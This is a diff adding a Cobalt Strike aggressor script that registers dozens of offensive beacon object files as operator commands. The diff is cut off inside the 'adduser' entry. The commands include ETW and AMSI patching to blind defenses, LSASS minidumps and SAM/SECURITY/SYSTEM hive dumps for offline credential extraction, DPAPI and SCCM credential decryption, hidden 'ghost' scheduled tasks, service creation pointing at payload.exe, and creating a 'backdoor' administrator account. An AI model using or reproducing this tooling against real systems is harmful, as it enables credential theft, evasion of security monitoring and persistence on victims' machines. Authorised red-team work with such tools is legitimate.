@@ -1,0 +1,1649 @@
+# SPDX-License-Identifier: MIT
+# SPDX-FileCopyrightText: 2024-2026 Dani <daniagungg@gmail.com>
+#
+# dani-suite.cna — Single Cobalt Strike aggressor script
+# Registers all 68 BOFs in DEF-Situational-Awareness-BOF as native beacon commands.
+#
+# Usage: Load via Cobalt Strike Script Manager (CS 4.x+)
+#        File → Script Manager → Load → dani-suite.cna
+#
+# Layout assumption:
+#   aggressor/dani-suite.cna   (this file)
+#   dist/<bof>.x64.o           (built artifacts)
+#
+# script_resource("../dist/X.x64.o") resolves relative to this .cna's directory.
+#
+# Phase 1 — Canary              (3 BOFs)
+# Phase 2 — Situational Aware   (25 BOFs)
+# Phase 3 — Remote Ops          (18 BOFs)
+# Phase 4 — OperatorsKit        (12 BOFs)
+# Phase 4 — C2-Collection       (8 BOFs)
+# Phase 5 — Persistence         (2 BOFs)
+# Phase 6 — Loader              (1 BOF)
+# Total: 69 registered commands (68 BOFs + dani-help meta)
+
+# ============================================================
+# LOAD-TIME BANNER
+# ============================================================
+println("============================================================");
+println("  DEF-Situational-Awareness-BOF  //  by Dani");
+println("  68 BOFs across 6 phases loaded");
+println("  Type 'dani-help' in a beacon for the full command list.");
+println("============================================================");
+
+# ============================================================
+# HELPER — shared path-check + execute
+# ============================================================
+sub dani_run {
+    # $1 = bid, $2 = bof name (no extension), $3 = packed args (or "")
+    local('$bid $name $args $path');
+    $bid  = $1;
+    $name = $2;
+    $args = $3;
+    $path = script_resource("../dist/" . $name . ".x64.o");
+    if (!-exists $path) {
+        berror($bid, "[dani-suite] " . $name . ".x64.o not found at: " . $path);
+        berror($bid, "Run 'cargo make --profile release' in the repo root to build all BOFs.");
+        return;
+    }
+    bof_inline_execute($bid, $path, "go", $args);
+}
+
+# ============================================================
+# ============================================================
+# PHASE 1 — CANARY  (3 BOFs)
+# ============================================================
+# ============================================================
+
+# --- uptime ---
+alias uptime {
+    dani_run($1, "uptime", "");
+}
+beacon_command_register(
+    "uptime",
+    "Uptime via KUSER_SHARED_DATA — T1082 (by Dani)",
+    "Synopsis: uptime\n\n" .
+    "Description: Read system uptime directly from KUSER_SHARED_DATA without\n" .
+    "calling GetTickCount or NtQuerySystemInformation. No API import.\n\n" .
+    "MITRE ATT&CK: T1082 (System Information Discovery)\n\n" .
+    "Phase: 1 — Canary\nArgs: none"
+);
+
+# --- hostname ---
+alias hostname {
+    dani_run($1, "hostname", "");
+}
+beacon_command_register(
+    "hostname",
+    "NetBIOS/DNS/FQDN via DFR GetComputerNameExA — T1082 (by Dani)",
+    "Synopsis: hostname\n\n" .
+    "Description: Enumerate hostname in all three forms (NetBIOS, DNS, FQDN)\n" .
+    "using a Direct Function Resolution (DFR) call to GetComputerNameExA,\n" .
+    "validated via canary 2 path.\n\n" .
+    "MITRE ATT&CK: T1082 (System Information Discovery)\n\n" .
+    "Phase: 1 — Canary\nArgs: none"
+);
+
+# --- whoami ---
+alias whoami {
+    dani_run($1, "whoami", "");
+}
+beacon_command_register(
+    "whoami",
+    "Token info via indirect NtOpenProcessToken — T1033/T1134 (by Dani)",
+    "Synopsis: whoami\n\n" .
+    "Description: Dump current process token information (user, groups, privileges,\n" .
+    "integrity level) via an indirect syscall to NtOpenProcessToken. Uses HalosGate\n" .
+    "for SSN resolution. No CreateProcess, no whoami.exe.\n\n" .
+    "MITRE ATT&CK: T1033 (System Owner/User Discovery),\n" .
+    "              T1134 (Access Token Manipulation)\n\n" .
+    "Phase: 1 — Canary\nArgs: none"
+);
+
+# ============================================================
+# ============================================================
+# PHASE 2 — SITUATIONAL AWARENESS  (25 BOFs)
+# ============================================================
+# ============================================================
+
+# --- arp ---
+alias arp {
+    dani_run($1, "arp", "");
+}
+beacon_command_register(
+    "arp",
+    "ARP cache enumeration — T1018 (by Dani)",
+    "Synopsis: arp\n\n" .
+    "Description: Dump the local ARP cache to discover adjacent hosts on\n" .
+    "the same subnet without generating network traffic.\n\n" .
+    "MITRE ATT&CK: T1018 (Remote System Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- env ---
+alias env {
+    dani_run($1, "env", "");
+}
+beacon_command_register(
+    "env",
+    "Environment variables via PEB walk — T1082 (by Dani)",
+    "Synopsis: env\n\n" .
+    "Description: Enumerate all process environment variables by walking the\n" .
+    "Process Environment Block (PEB) directly. No GetEnvironmentStrings call.\n\n" .
+    "MITRE ATT&CK: T1082 (System Information Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- ipconfig ---
+alias ipconfig {
+    dani_run($1, "ipconfig", "");
+}
+beacon_command_register(
+    "ipconfig",
+    "Network adapter info — T1016 (by Dani)",
+    "Synopsis: ipconfig\n\n" .
+    "Description: Enumerate all network adapters, IP addresses, subnets,\n" .
+    "gateways, and DNS servers via GetAdaptersInfo.\n\n" .
+    "MITRE ATT&CK: T1016 (System Network Configuration Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- netstat ---
+alias netstat {
+    dani_run($1, "netstat", "");
+}
+beacon_command_register(
+    "netstat",
+    "TCP/UDP connections — T1049 (by Dani)",
+    "Synopsis: netstat\n\n" .
+    "Description: List all active TCP and UDP endpoints on the host,\n" .
+    "including remote addresses and owning PIDs.\n\n" .
+    "MITRE ATT&CK: T1049 (System Network Connections Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- netuser ---
+alias netuser {
+    local('$bid $host $args');
+    $bid  = $1;
+    $host = $2;
+    if ($host is $null) { $host = ""; }
+    $args = bof_pack($bid, "z", $host);
+    dani_run($bid, "netuser", $args);
+}
+beacon_command_register(
+    "netuser",
+    "Local/domain user enumeration — T1087.001/T1087.002 (by Dani)",
+    "Synopsis: netuser [hostname]\n\n" .
+    "Description: Enumerate local and domain user accounts. Optionally target\n" .
+    "a remote host. Without a hostname, enumerates the local machine.\n\n" .
+    "Examples:\n" .
+    "  netuser\n" .
+    "  netuser DC01\n\n" .
+    "MITRE ATT&CK: T1087.001 (Account Discovery: Local Account),\n" .
+    "              T1087.002 (Account Discovery: Domain Account)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: [hostname] (optional)"
+);
+
+# --- netshare ---
+alias netshare {
+    local('$bid $host $args');
+    $bid  = $1;
+    $host = $2;
+    if ($host is $null) { $host = ""; }
+    $args = bof_pack($bid, "z", $host);
+    dani_run($bid, "netshare", $args);
+}
+beacon_command_register(
+    "netshare",
+    "SMB share enumeration — T1135 (by Dani)",
+    "Synopsis: netshare [hostname]\n\n" .
+    "Description: List SMB network shares on the local or a remote host.\n\n" .
+    "Examples:\n" .
+    "  netshare\n" .
+    "  netshare FILESERVER01\n\n" .
+    "MITRE ATT&CK: T1135 (Network Share Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: [hostname] (optional)"
+);
+
+# --- netloggedon ---
+alias netloggedon {
+    local('$bid $host $args');
+    $bid  = $1;
+    $host = $2;
+    if ($host is $null) { $host = ""; }
+    $args = bof_pack($bid, "z", $host);
+    dani_run($bid, "netloggedon", $args);
+}
+beacon_command_register(
+    "netloggedon",
+    "Logged-on users — T1033 (by Dani)",
+    "Synopsis: netloggedon [hostname]\n\n" .
+    "Description: Enumerate users currently logged on to the local or a\n" .
+    "remote host via NetWkstaUserEnum.\n\n" .
+    "Examples:\n" .
+    "  netloggedon\n" .
+    "  netloggedon WS-CORP-01\n\n" .
+    "MITRE ATT&CK: T1033 (System Owner/User Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: [hostname] (optional)"
+);
+
+# --- tasklist ---
+alias tasklist {
+    dani_run($1, "tasklist", "");
+}
+beacon_command_register(
+    "tasklist",
+    "Process list via indirect NtQuerySystemInformation — T1057 (by Dani)",
+    "Synopsis: tasklist\n\n" .
+    "Description: Enumerate all running processes (name, PID, PPID, session,\n" .
+    "architecture) via an indirect syscall to NtQuerySystemInformation.\n\n" .
+    "MITRE ATT&CK: T1057 (Process Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- schtasksquery ---
+alias schtasksquery {
+    local('$bid $host $taskpath $args');
+    $bid      = $1;
+    $host     = $2;
+    $taskpath = $3;
+    if ($host is $null)     { $host = ""; }
+    if ($taskpath is $null) { $taskpath = "\\"; }
+    $args = bof_pack($bid, "zz", $host, $taskpath);
+    dani_run($bid, "schtasksquery", $args);
+}
+beacon_command_register(
+    "schtasksquery",
+    "Scheduled tasks via COM — T1053.005/T1518 (by Dani)",
+    "Synopsis: schtasksquery [hostname] [taskpath]\n\n" .
+    "Description: Enumerate scheduled tasks using the Task Scheduler COM interface\n" .
+    "(ITaskService). Optionally target a remote host and/or specific task folder.\n\n" .
+    "Examples:\n" .
+    "  schtasksquery\n" .
+    "  schtasksquery DC01\n" .
+    "  schtasksquery DC01 \\Microsoft\\Windows\n\n" .
+    "MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task),\n" .
+    "              T1518 (Software Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: [hostname] [taskpath] (both optional)"
+);
+
+# --- reg-query ---
+alias reg-query {
+    local('$bid $hive $subkey $args');
+    $bid    = $1;
+    $hive   = $2;
+    $subkey = $3;
+    if ($hive is $null || $subkey is $null) {
+        berror($bid, "Use: reg-query <hive> <subkey>\nExample: reg-query HKLM SOFTWARE\\Microsoft\\Windows\\CurrentVersion");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $hive, $subkey);
+    dani_run($bid, "reg-query", $args);
+}
+beacon_command_register(
+    "reg-query",
+    "Registry key read — T1012 (by Dani)",
+    "Synopsis: reg-query <hive> <subkey>\n\n" .
+    "Description: Read all values from the specified registry key.\n" .
+    "Hive must be one of: HKLM, HKCU, HKCR, HKU, HKCC\n\n" .
+    "Examples:\n" .
+    "  reg-query HKLM SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\n" .
+    "  reg-query HKCU Environment\n\n" .
+    "MITRE ATT&CK: T1012 (Query Registry)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: <hive> <subkey> (required)"
+);
+
+# --- windowlist ---
+alias windowlist {
+    local('$bid $visonly $args');
+    $bid    = $1;
+    $visonly = $2;
+    if ($visonly is $null) { $visonly = "0"; }
+    $args = bof_pack($bid, "z", $visonly);
+    dani_run($bid, "windowlist", $args);
+}
+beacon_command_register(
+    "windowlist",
+    "Window enumeration — T1010 (by Dani)",
+    "Synopsis: windowlist [visible-only:0|1]\n\n" .
+    "Description: Enumerate top-level windows and their owning processes.\n" .
+    "Pass 1 to list only visible windows; 0 (default) for all windows.\n\n" .
+    "Examples:\n" .
+    "  windowlist\n" .
+    "  windowlist 1\n\n" .
+    "MITRE ATT&CK: T1010 (Application Window Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: [visible-only] 0|1 (optional, default 0)"
+);
+
+# --- routeprint ---
+alias routeprint {
+    dani_run($1, "routeprint", "");
+}
+beacon_command_register(
+    "routeprint",
+    "Routing table enumeration — T1016 (by Dani)",
+    "Synopsis: routeprint\n\n" .
+    "Description: Dump the IPv4 routing table via GetIpForwardTable.\n\n" .
+    "MITRE ATT&CK: T1016 (System Network Configuration Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- ldapsearch ---
+alias ldapsearch {
+    local('$bid $basedn $filter $attrs $args');
+    $bid    = $1;
+    $basedn = $2;
+    $filter = $3;
+    $attrs  = $4;
+    if ($basedn is $null || $filter is $null) {
+        berror($bid, "Use: ldapsearch <basedn> <filter> [attrs]\nExample: ldapsearch DC=corp,DC=local (objectClass=user) sAMAccountName,mail");
+        return;
+    }
+    if ($attrs is $null) { $attrs = ""; }
+    $args = bof_pack($bid, "zzz", $basedn, $filter, $attrs);
+    dani_run($bid, "ldapsearch", $args);
+}
+beacon_command_register(
+    "ldapsearch",
+    "LDAP query — T1087.002/T1018 (by Dani)",
+    "Synopsis: ldapsearch <basedn> <filter> [attrs]\n\n" .
+    "Description: Execute an LDAP search against the domain controller using\n" .
+    "paged results. Returns matching objects with requested attributes.\n\n" .
+    "Examples:\n" .
+    "  ldapsearch DC=corp,DC=local (objectClass=computer) name,dNSHostName\n" .
+    "  ldapsearch DC=corp,DC=local (objectClass=user) sAMAccountName,memberOf\n\n" .
+    "MITRE ATT&CK: T1087.002 (Account Discovery: Domain Account),\n" .
+    "              T1018 (Remote System Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: <basedn> <filter> [attrs] (attrs optional)"
+);
+
+# --- nonpaged-ldapsearch ---
+alias nonpaged-ldapsearch {
+    local('$bid $basedn $filter $args');
+    $bid    = $1;
+    $basedn = $2;
+    $filter = $3;
+    if ($basedn is $null || $filter is $null) {
+        berror($bid, "Use: nonpaged-ldapsearch <basedn> <filter>\nExample: nonpaged-ldapsearch DC=corp,DC=local (objectClass=group)");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $basedn, $filter);
+    dani_run($bid, "nonpaged-ldapsearch", $args);
+}
+beacon_command_register(
+    "nonpaged-ldapsearch",
+    "Non-paged LDAP query — T1087.002 (by Dani)",
+    "Synopsis: nonpaged-ldapsearch <basedn> <filter>\n\n" .
+    "Description: Execute an LDAP search without paging controls — useful when\n" .
+    "paged LDAP is restricted or for quick small result sets.\n\n" .
+    "Examples:\n" .
+    "  nonpaged-ldapsearch DC=corp,DC=local (objectClass=group)\n\n" .
+    "MITRE ATT&CK: T1087.002 (Account Discovery: Domain Account)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: <basedn> <filter> (required)"
+);
+
+# --- adcs-enum-com ---
+alias adcs-enum-com {
+    dani_run($1, "adcs-enum-com", "");
+}
+beacon_command_register(
+    "adcs-enum-com",
+    "ADCS certificate template enumeration via COM — T1518.001 (by Dani)",
+    "Synopsis: adcs-enum-com\n\n" .
+    "Description: Enumerate Active Directory Certificate Services (ADCS)\n" .
+    "certificate templates via the ICertConfig COM interface without\n" .
+    "using certutil.exe or LDAP.\n\n" .
+    "MITRE ATT&CK: T1518.001 (Software Discovery: Security Software Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- list-firewall ---
+alias list-firewall {
+    dani_run($1, "list-firewall", "");
+}
+beacon_command_register(
+    "list-firewall",
+    "Windows Firewall rules enumeration — T1518.001 (by Dani)",
+    "Synopsis: list-firewall\n\n" .
+    "Description: Enumerate all Windows Firewall rules (name, direction, action,\n" .
+    "protocol, ports, enabled state) via the INetFwRules COM interface.\n\n" .
+    "MITRE ATT&CK: T1518.001 (Software Discovery: Security Software Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- enum-filter-driver ---
+alias enum-filter-driver {
+    dani_run($1, "enum-filter-driver", "");
+}
+beacon_command_register(
+    "enum-filter-driver",
+    "Mini-filter driver enumeration — T1518.001/T1014 (by Dani)",
+    "Synopsis: enum-filter-driver\n\n" .
+    "Description: Enumerate installed Windows mini-filter drivers via\n" .
+    "FilterFindFirst/FilterFindNext. Identifies EDR/AV kernel drivers.\n\n" .
+    "MITRE ATT&CK: T1518.001 (Software Discovery: Security Software Discovery),\n" .
+    "              T1014 (Rootkit)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- wmi-query ---
+alias wmi-query {
+    local('$bid $ns $wql $args');
+    $bid = $1;
+    $ns  = $2;
+    $wql = $3;
+    if ($ns is $null || $wql is $null) {
+        berror($bid, "Use: wmi-query <namespace> <wql>\nExample: wmi-query root\\cimv2 SELECT * FROM Win32_Process");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $ns, $wql);
+    dani_run($bid, "wmi-query", $args);
+}
+beacon_command_register(
+    "wmi-query",
+    "WMI query execution — T1047 (by Dani)",
+    "Synopsis: wmi-query <namespace> <wql>\n\n" .
+    "Description: Execute an arbitrary WMI query via IWbemServices.\n\n" .
+    "Examples:\n" .
+    "  wmi-query root\\cimv2 SELECT * FROM Win32_Process\n" .
+    "  wmi-query root\\cimv2 SELECT * FROM Win32_Service WHERE State='Running'\n\n" .
+    "MITRE ATT&CK: T1047 (Windows Management Instrumentation)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: <namespace> <wql> (required)"
+);
+
+# --- get-dpapi-system ---
+alias get-dpapi-system {
+    dani_run($1, "get-dpapi-system", "");
+}
+beacon_command_register(
+    "get-dpapi-system",
+    "DPAPI system master key extraction — T1555.004 (by Dani)",
+    "Synopsis: get-dpapi-system\n\n" .
+    "Description: Extract the DPAPI system master key from LSASS memory.\n" .
+    "Requires SYSTEM or SeDebugPrivilege. Output can be used to decrypt\n" .
+    "DPAPI-protected secrets offline.\n\n" .
+    "MITRE ATT&CK: T1555.004 (Credentials from Password Stores: Windows Credential Manager)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- clipboard ---
+alias clipboard {
+    dani_run($1, "clipboard", "");
+}
+beacon_command_register(
+    "clipboard",
+    "Clipboard content dump — T1115 (by Dani)",
+    "Synopsis: clipboard\n\n" .
+    "Description: Read the current text content of the Windows clipboard\n" .
+    "via OpenClipboard/GetClipboardData.\n\n" .
+    "MITRE ATT&CK: T1115 (Clipboard Data)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- dnscache ---
+alias dnscache {
+    dani_run($1, "dnscache", "");
+}
+beacon_command_register(
+    "dnscache",
+    "DNS resolver cache dump — T1016.001 (by Dani)",
+    "Synopsis: dnscache\n\n" .
+    "Description: Dump the Windows DNS resolver cache entries to reveal\n" .
+    "recently resolved hostnames — useful for mapping internal infrastructure.\n\n" .
+    "MITRE ATT&CK: T1016.001 (System Network Configuration Discovery: Internet Connection Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- driversigs ---
+alias driversigs {
+    dani_run($1, "driversigs", "");
+}
+beacon_command_register(
+    "driversigs",
+    "Loaded driver signature check — T1518.001 (by Dani)",
+    "Synopsis: driversigs\n\n" .
+    "Description: Enumerate all loaded kernel drivers and check their digital\n" .
+    "signatures to identify unsigned or suspicious drivers.\n\n" .
+    "MITRE ATT&CK: T1518.001 (Software Discovery: Security Software Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- findmodule ---
+alias findmodule {
+    local('$bid $pid $modname $args');
+    $bid     = $1;
+    $pid     = $2;
+    $modname = $3;
+    if ($pid is $null || $modname is $null) {
+        berror($bid, "Use: findmodule <pid> <modulename>\nExample: findmodule 4424 amsi.dll");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $pid, $modname);
+    dani_run($bid, "findmodule", $args);
+}
+beacon_command_register(
+    "findmodule",
+    "Find module in remote process — T1057 (by Dani)",
+    "Synopsis: findmodule <pid> <modulename>\n\n" .
+    "Description: Check whether a specific DLL/module is loaded in a\n" .
+    "target process by PID. Useful for detecting security product DLLs\n" .
+    "injected into running processes.\n\n" .
+    "Examples:\n" .
+    "  findmodule 4424 amsi.dll\n" .
+    "  findmodule 1234 MpOav.dll\n\n" .
+    "MITRE ATT&CK: T1057 (Process Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: <pid> <modulename> (required)"
+);
+
+# --- sccm-decrypt ---
+alias sccm-decrypt {
+    dani_run($1, "sccm-decrypt", "");
+}
+beacon_command_register(
+    "sccm-decrypt",
+    "SCCM NAA credential decryption — T1555 (by Dani)",
+    "Synopsis: sccm-decrypt\n\n" .
+    "Description: Decrypt SCCM Network Access Account (NAA) credentials\n" .
+    "stored in the WMI repository using the DPAPI machine key.\n\n" .
+    "MITRE ATT&CK: T1555 (Credentials from Password Stores)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# --- ldapsec-check ---
+alias ldapsec-check {
+    dani_run($1, "ldapsec-check", "");
+}
+beacon_command_register(
+    "ldapsec-check",
+    "LDAP signing/channel-binding probe — T1518 (by Dani)",
+    "Synopsis: ldapsec-check\n\n" .
+    "Description: Probe the domain controller to determine whether LDAP\n" .
+    "signing and channel binding are required or optional. Identifies\n" .
+    "environments vulnerable to LDAP relay attacks.\n\n" .
+    "MITRE ATT&CK: T1518 (Software Discovery)\n\n" .
+    "Phase: 2 — Situational Awareness\nArgs: none"
+);
+
+# ============================================================
+# ============================================================
+# PHASE 3 — REMOTE OPS  (18 BOFs)
+# ============================================================
+# ============================================================
+
+# --- portscan ---
+alias portscan {
+    local('$bid $host $portrange $args');
+    $bid       = $1;
+    $host      = $2;
+    $portrange = $3;
+    if ($host is $null || $portrange is $null) {
+        berror($bid, "Use: portscan <host> <port-range>\nExample: portscan 10.10.10.5 22,80,443,3389\nExample: portscan 10.10.10.5 1-1024");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $host, $portrange);
+    dani_run($bid, "portscan", $args);
+}
+beacon_command_register(
+    "portscan",
+    "TCP port scanner — T1046 (by Dani)",
+    "Synopsis: portscan <host> <port-range>\n\n" .
+    "Description: Scan TCP ports on a target host. Port range can be\n" .
+    "comma-separated values or a dash-delimited range.\n\n" .
+    "Examples:\n" .
+    "  portscan 10.10.10.5 22,80,443,3389,8080\n" .
+    "  portscan 192.168.1.1 1-1024\n\n" .
+    "MITRE ATT&CK: T1046 (Network Service Discovery)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <host> <port-range> (required)"
+);
+
+# --- etw-patch ---
+alias etw-patch {
+    dani_run($1, "etw-patch", "");
+}
+beacon_command_register(
+    "etw-patch",
+    "Patch EtwEventWrite to blind ETW — T1562.006 (by Dani)",
+    "Synopsis: etw-patch\n\n" .
+    "Description: Overwrite the first bytes of EtwEventWrite in ntdll.dll\n" .
+    "with a RET instruction to disable ETW event emission from the current\n" .
+    "process. Blinds many EDR data collection paths.\n\n" .
+    "MITRE ATT&CK: T1562.006 (Impair Defenses: Indicator Blocking)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: none"
+);
+
+# --- amsi-patch ---
+alias amsi-patch {
+    dani_run($1, "amsi-patch", "");
+}
+beacon_command_register(
+    "amsi-patch",
+    "Patch AmsiScanBuffer to bypass AMSI — T1562.001 (by Dani)",
+    "Synopsis: amsi-patch\n\n" .
+    "Description: Overwrite AmsiScanBuffer in amsi.dll to always return\n" .
+    "AMSI_RESULT_CLEAN, bypassing Antimalware Scan Interface checks in\n" .
+    "the current process.\n\n" .
+    "MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: none"
+);
+
+# --- enablepriv ---
+alias enablepriv {
+    local('$bid $priv $args');
+    $bid  = $1;
+    $priv = $2;
+    if ($priv is $null) {
+        berror($bid, "Use: enablepriv <privname>\nExample: enablepriv SeDebugPrivilege\nExample: enablepriv SeImpersonatePrivilege");
+        return;
+    }
+    $args = bof_pack($bid, "z", $priv);
+    dani_run($bid, "enablepriv", $args);
+}
+beacon_command_register(
+    "enablepriv",
+    "Enable token privilege — T1134.002 (by Dani)",
+    "Synopsis: enablepriv <privname>\n\n" .
+    "Description: Enable a specific privilege in the current process token\n" .
+    "using NtAdjustPrivilegesToken.\n\n" .
+    "Examples:\n" .
+    "  enablepriv SeDebugPrivilege\n" .
+    "  enablepriv SeImpersonatePrivilege\n" .
+    "  enablepriv SeTcbPrivilege\n\n" .
+    "MITRE ATT&CK: T1134.002 (Access Token Manipulation: Create Process with Token)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <privname> (required)"
+);
+
+# --- procdump ---
+alias procdump {
+    local('$bid $pid $outpath $args');
+    $bid     = $1;
+    $pid     = $2;
+    $outpath = $3;
+    if ($pid is $null || $outpath is $null) {
+        berror($bid, "Use: procdump <pid> <outpath>\nExample: procdump 636 C:\\Windows\\Temp\\lsass.dmp");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $pid, $outpath);
+    dani_run($bid, "procdump", $args);
+}
+beacon_command_register(
+    "procdump",
+    "MiniDump process memory — T1003.001 (by Dani)",
+    "Synopsis: procdump <pid> <outpath>\n\n" .
+    "Description: Create a MiniDump of the target process to disk using\n" .
+    "MiniDumpWriteDump. Typical use is lsass.exe (PID varies) for\n" .
+    "offline credential extraction.\n\n" .
+    "Examples:\n" .
+    "  procdump 636 C:\\Windows\\Temp\\lsass.dmp\n\n" .
+    "MITRE ATT&CK: T1003.001 (OS Credential Dumping: LSASS Memory)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <pid> <outpath> (required)"
+);
+
+# --- ghost-task ---
+alias ghost-task {
+    local('$bid $name $cmdpath $remove $args');
+    $bid     = $1;
+    $name    = $2;
+    $cmdpath = $3;
+    $remove  = $4;
+    if ($name is $null || $cmdpath is $null) {
+        berror($bid, "Use: ghost-task <name> <cmdpath> [remove]\nExample: ghost-task updatesvc C:\\Windows\\System32\\cmd.exe\nExample: ghost-task updatesvc C:\\Windows\\System32\\cmd.exe remove");
+        return;
+    }
+    if ($remove is $null) { $remove = ""; }
+    $args = bof_pack($bid, "zzz", $name, $cmdpath, $remove);
+    dani_run($bid, "ghost-task", $args);
+}
+beacon_command_register(
+    "ghost-task",
+    "Hidden scheduled task creation — T1053.005 (by Dani)",
+    "Synopsis: ghost-task <name> <cmdpath> [remove]\n\n" .
+    "Description: Create a scheduled task with a hidden/ghost registration\n" .
+    "that does not appear in schtasks output by manipulating the task XML\n" .
+    "security descriptor. Pass 'remove' as third arg to delete the task.\n\n" .
+    "Examples:\n" .
+    "  ghost-task updatesvc C:\\Windows\\System32\\cmd.exe\n" .
+    "  ghost-task updatesvc C:\\Windows\\System32\\cmd.exe remove\n\n" .
+    "MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <name> <cmdpath> [remove]"
+);
+
+# --- reg-save ---
+alias reg-save {
+    local('$bid $hive $subkey $outpath $args');
+    $bid     = $1;
+    $hive    = $2;
+    $subkey  = $3;
+    $outpath = $4;
+    if ($hive is $null || $subkey is $null || $outpath is $null) {
+        berror($bid, "Use: reg-save <hive> <subkey> <outpath>\nExample: reg-save HKLM SAM C:\\Windows\\Temp\\SAM.hiv");
+        return;
+    }
+    $args = bof_pack($bid, "zzz", $hive, $subkey, $outpath);
+    dani_run($bid, "reg-save", $args);
+}
+beacon_command_register(
+    "reg-save",
+    "Registry hive dump — T1003.002/T1012 (by Dani)",
+    "Synopsis: reg-save <hive> <subkey> <outpath>\n\n" .
+    "Description: Save a registry hive or subkey to a file on disk using\n" .
+    "RegSaveKey. Typically used to dump SAM, SECURITY, and SYSTEM hives\n" .
+    "for offline credential extraction.\n\n" .
+    "Examples:\n" .
+    "  reg-save HKLM SAM C:\\Windows\\Temp\\SAM.hiv\n" .
+    "  reg-save HKLM SECURITY C:\\Windows\\Temp\\SEC.hiv\n" .
+    "  reg-save HKLM SYSTEM C:\\Windows\\Temp\\SYS.hiv\n\n" .
+    "MITRE ATT&CK: T1003.002 (OS Credential Dumping: Security Account Manager),\n" .
+    "              T1012 (Query Registry)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <hive> <subkey> <outpath> (required)"
+);
+
+# --- sc-create ---
+alias sc-create {
+    local('$bid $name $bin $args');
+    $bid  = $1;
+    $name = $2;
+    $bin  = $3;
+    if ($name is $null || $bin is $null) {
+        berror($bid, "Use: sc-create <name> <binpath>\nExample: sc-create mysvc C:\\Windows\\Temp\\payload.exe");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $name, $bin);
+    dani_run($bid, "sc-create", $args);
+}
+beacon_command_register(
+    "sc-create",
+    "Create Windows service — T1543.003 (by Dani)",
+    "Synopsis: sc-create <name> <binpath>\n\n" .
+    "Description: Create a new Windows service with the specified name and\n" .
+    "binary path using OpenSCManager/CreateService.\n\n" .
+    "Examples:\n" .
+    "  sc-create mysvc C:\\Windows\\Temp\\payload.exe\n\n" .
+    "MITRE ATT&CK: T1543.003 (Create or Modify System Process: Windows Service)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <name> <binpath> (required)"
+);
+
+# --- sc-delete ---
+alias sc-delete {
+    local('$bid $name $args');
+    $bid  = $1;
+    $name = $2;
+    if ($name is $null) {
+        berror($bid, "Use: sc-delete <name>\nExample: sc-delete mysvc");
+        return;
+    }
+    $args = bof_pack($bid, "z", $name);
+    dani_run($bid, "sc-delete", $args);
+}
+beacon_command_register(
+    "sc-delete",
+    "Delete Windows service — T1489 (by Dani)",
+    "Synopsis: sc-delete <name>\n\n" .
+    "Description: Delete an existing Windows service by name using\n" .
+    "OpenSCManager/DeleteService.\n\n" .
+    "Examples:\n" .
+    "  sc-delete mysvc\n\n" .
+    "MITRE ATT&CK: T1489 (Service Stop)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <name> (required)"
+);
+
+# --- adduser ---
+alias adduser {
+    local('$bid $user $pass $admin $args');
+    $bid   = $1;
+    $user  = $2;
+    $pass  = $3;
+    $admin = $4;
+    if ($user is $null || $pass is $null) {
+        berror($bid, "Use: adduser <username> <password> [admin]\nExample: adduser backdoor P@ssw0rd123\nExample: adduser backdoor P@ssw0rd123 admin");
+        return;
+    }
+    if ($admin is $null) { $admin = ""; }
+    $args = bof_pack($bid, "zzz", $user, $pass, $admin);
+    dani_run($bid, "adduser", $args);
+}
+beacon_command_register(
+    "adduser",
+    "Create local user account — T1136.001 (by Dani)",
+    "Synopsis: adduser <username> <password> [admin]\n\n" .
+    "Description: Create a new local user account. Pass 'admin' as the\n" .
+    "third argument to add the user to the local Administrators group.\n\n" .
+    "Examples:\n" .
+    "  adduser backdoor P@ssw0rd123\n" .
+    "  adduser backdoor P@ssw0rd123 admin\n\n" .
